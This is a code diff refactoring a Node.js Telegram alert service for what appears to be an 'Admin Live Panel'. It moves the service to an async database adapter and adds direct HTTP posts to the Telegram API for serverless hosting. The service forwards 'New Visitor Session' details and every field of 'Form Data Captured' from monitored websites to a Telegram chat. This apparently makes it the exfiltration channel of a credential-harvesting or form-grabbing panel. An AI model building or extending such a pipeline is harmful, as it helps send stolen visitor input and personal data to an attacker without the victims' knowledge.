@@ -1,4 +1,4 @@
-const { getDb } = require('../database/init');
+const { getAdapter } = require('../database/adapter');
 const config = require('../config/default');
 
 class TelegramService {
@@ -13,7 +13,7 @@ class TelegramService {
    */
   async initialize() {
     try {
-      const cfg = this.getConfig();
+      const cfg = await this.getConfig();
       if (cfg && cfg.bot_token && cfg.is_active) {
         await this._startBot(cfg.bot_token);
       }
@@ -26,6 +26,11 @@ class TelegramService {
    * Start the bot with polling. Stops any existing instance first.
    */
   async _startBot(token) {
+    if (process.env.VERCEL) {
+      console.log('ℹ️ Telegram long polling disabled in serverless environment (uses webhook mode instead)');
+      return;
+    }
+
     await this.stop();
 
     try {
@@ -60,11 +65,27 @@ class TelegramService {
    */
   async sendAlert(title, message) {
     try {
-      const cfg = this.getConfig();
-      if (!cfg || !cfg.is_active || !cfg.chat_id || !this.bot) return false;
+      const cfg = await this.getConfig();
+      if (!cfg || !cfg.is_active || !cfg.chat_id) return false;
 
       const html = `<b>🔔 ${this._escapeHtml(title)}</b>\n\n${message}`;
-      await this.bot.sendMessage(cfg.chat_id, html, { parse_mode: 'HTML' });
+
+      if (process.env.VERCEL) {
+        // Send via HTTP POST call directly to Telegram API for serverless mode
+        const token = cfg.bot_token;
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: cfg.chat_id,
+            text: html,
+            parse_mode: 'HTML'
+          })
+        });
+      } else if (this.bot) {
+        await this.bot.sendMessage(cfg.chat_id, html, { parse_mode: 'HTML' });
+      }
       return true;
     } catch (err) {
       console.error('⚠️  Telegram sendAlert failed:', err.message);
@@ -77,8 +98,8 @@ class TelegramService {
    */
   async sendSessionAlert(session) {
     try {
-      const cfg = this.getConfig();
-      if (!cfg || !cfg.is_active || !cfg.notify_new_session || !cfg.chat_id || !this.bot) return false;
+      const cfg = await this.getConfig();
+      if (!cfg || !cfg.is_active || !cfg.notify_new_session || !cfg.chat_id) return false;
 
       const lines = [
         `<b>👤 New Visitor Session</b>`,
@@ -93,7 +114,23 @@ class TelegramService {
         `🆔 <b>Session:</b> <code>${this._escapeHtml(session.id || '')}</code>`
       ];
 
-      await this.bot.sendMessage(cfg.chat_id, lines.join('\n'), { parse_mode: 'HTML' });
+      const html = lines.join('\n');
+
+      if (process.env.VERCEL) {
+        const token = cfg.bot_token;
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: cfg.chat_id,
+            text: html,
+            parse_mode: 'HTML'
+          })
+        });
+      } else if (this.bot) {
+        await this.bot.sendMessage(cfg.chat_id, html, { parse_mode: 'HTML' });
+      }
       return true;
     } catch (err) {
       console.error('⚠️  Telegram sendSessionAlert failed:', err.message);
@@ -106,8 +143,8 @@ class TelegramService {
    */
   async sendFormDataAlert(data, website) {
     try {
-      const cfg = this.getConfig();
-      if (!cfg || !cfg.is_active || !cfg.notify_form_data || !cfg.chat_id || !this.bot) return false;
+      const cfg = await this.getConfig();
+      if (!cfg || !cfg.is_active || !cfg.notify_form_data || !cfg.chat_id) return false;
 
       const lines = [
         `<b>📝 Form Data Captured</b>`,
@@ -117,7 +154,6 @@ class TelegramService {
         ``
       ];
 
-      // Format each form field
       if (data.fields && typeof data.fields === 'object') {
         lines.push(`<b>📋 Fields:</b>`);
         for (const [key, value] of Object.entries(data.fields)) {
@@ -130,7 +166,23 @@ class TelegramService {
         }
       }
 
-      await this.bot.sendMessage(cfg.chat_id, lines.join('\n'), { parse_mode: 'HTML' });
+      const html = lines.join('\n');
+
+      if (process.env.VERCEL) {
+        const token = cfg.bot_token;
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: cfg.chat_id,
+            text: html,
+            parse_mode: 'HTML'
+          })
+        });
+      } else if (this.bot) {
+        await this.bot.sendMessage(cfg.chat_id, html, { parse_mode: 'HTML' });
+      }
       return true;
     } catch (err) {
       console.error('⚠️  Telegram sendFormDataAlert failed:', err.message);
@@ -143,8 +195,8 @@ class TelegramService {
    */
   async sendErrorAlert(error) {
     try {
-      const cfg = this.getConfig();
-      if (!cfg || !cfg.is_active || !cfg.notify_errors || !cfg.chat_id || !this.bot) return false;
+      const cfg = await this.getConfig();
+      if (!cfg || !cfg.is_active || !cfg.notify_errors || !cfg.chat_id) return false;
 
       const errorMsg = typeof error === 'string' ? error : (error.message || JSON.stringify(error));
       const stack = error.stack ? `\n\n<pre>${this._escapeHtml(error.stack.substring(0, 500))}</pre>` : '';
@@ -157,7 +209,23 @@ class TelegramService {
         stack
       ];
 
-      await this.bot.sendMessage(cfg.chat_id, lines.join('\n'), { parse_mode: 'HTML' });
+      const html = lines.join('\n');
+
+      if (process.env.VERCEL) {
+        const token = cfg.bot_token;
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: cfg.chat_id,
+            text: html,
+            parse_mode: 'HTML'
+          })
+        });
+      } else if (this.bot) {
+        await this.bot.sendMessage(cfg.chat_id, html, { parse_mode: 'HTML' });
+      }
       return true;
     } catch (err) {
       console.error('⚠️  Telegram sendErrorAlert failed:', err.message);
@@ -168,10 +236,10 @@ class TelegramService {
   /**
    * Get current Telegram config from the database.
    */
-  getConfig() {
+  async getConfig() {
     try {
-      const db = getDb();
-      const row = db.prepare('SELECT * FROM telegram_config WHERE id = 1').get();
+      const db = getAdapter();
+      const row = await db.get('SELECT * FROM telegram_config WHERE id = 1');
       return row || null;
     } catch (err) {
       console.error('⚠️  Failed to get Telegram config:', err.message);
@@ -184,10 +252,10 @@ class TelegramService {
    */
   async updateConfig(newConfig) {
     try {
-      const db = getDb();
-      const current = this.getConfig();
+      const db = getAdapter();
+      const current = await this.getConfig();
 
-      db.prepare(`
+      await db.run(`
         UPDATE telegram_config SET
           bot_token = ?,
           chat_id = ?,
@@ -197,7 +265,7 @@ class TelegramService {
           notify_errors = ?,
           notify_page_views = ?
         WHERE id = 1
-      `).run(
+      `, [
         newConfig.bot_token ?? current?.bot_token ?? '',
         newConfig.chat_id ?? current?.chat_id ?? '',
         newConfig.is_active ?? current?.is_active ?? 0,
@@ -205,14 +273,13 @@ class TelegramService {
         newConfig.notify_form_data ?? current?.notify_form_data ?? 1,
         newConfig.notify_errors ?? current?.notify_errors ?? 1,
         newConfig.notify_page_views ?? current?.notify_page_views ?? 0
-      );
+      ]);
 
-      // Restart bot if token changed or active state changed
       const tokenChanged = newConfig.bot_token !== undefined && newConfig.bot_token !== current?.bot_token;
       const activeChanged = newConfig.is_active !== undefined && newConfig.is_active !== current?.is_active;
 
-      if (tokenChanged || activeChanged) {
-        const updatedCfg = this.getConfig();
+      if (!process.env.VERCEL && (tokenChanged || activeChanged)) {
+        const updatedCfg = await this.getConfig();
         if (updatedCfg && updatedCfg.is_active && updatedCfg.bot_token) {
           await this._startBot(updatedCfg.bot_token);
         } else {
@@ -232,19 +299,9 @@ class TelegramService {
    */
   async testConnection() {
     try {
-      const cfg = this.getConfig();
+      const cfg = await this.getConfig();
       if (!cfg || !cfg.bot_token || !cfg.chat_id) {
         return { success: false, error: 'Bot token and chat ID are required' };
-      }
-
-      // Create a temporary bot instance for testing if main bot is not running
-      let testBot = this.bot;
-      let isTemp = false;
-
-      if (!testBot) {
-        const TelegramBot = require('node-telegram-bot-api');
-        testBot = new TelegramBot(cfg.bot_token, { polling: false });
-        isTemp = true;
       }
 
       const msg = [
@@ -256,11 +313,33 @@ class TelegramService {
         `<i>This is a test message from your Admin Live Panel.</i>`
       ].join('\n');
 
-      await testBot.sendMessage(cfg.chat_id, msg, { parse_mode: 'HTML' });
+      if (process.env.VERCEL) {
+        const token = cfg.bot_token;
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: cfg.chat_id,
+            text: msg,
+            parse_mode: 'HTML'
+          })
+        });
+      } else {
+        let testBot = this.bot;
+        let isTemp = false;
 
-      // Clean up temp bot
-      if (isTemp) {
-        testBot = null;
+        if (!testBot) {
+          const TelegramBot = require('node-telegram-bot-api');
+          testBot = new TelegramBot(cfg.bot_token, { polling: false });
+          isTemp = true;
+        }
+
+        await testBot.sendMessage(cfg.chat_id, msg, { parse_mode: 'HTML' });
+
+        if (isTemp) {
+          testBot = null;
+        }
       }
 
       return { success: true };
@@ -276,18 +355,13 @@ class TelegramService {
     if (this.bot) {
       try {
         await this.bot.stopPolling();
-      } catch (err) {
-        // Ignore stop errors
-      }
+      } catch (err) {}
       this.bot = null;
       this.isRunning = false;
       console.log('🔴 Telegram bot stopped');
     }
   }
 
-  /**
-   * Escape HTML special characters for safe Telegram message formatting.
-   */
   _escapeHtml(text) {
     if (!text) return '';
     return String(text)
@@ -298,6 +372,5 @@ class TelegramService {
   }
 }
 
-// Export singleton instance
 const telegramService = new TelegramService();
 module.exports = telegramService;
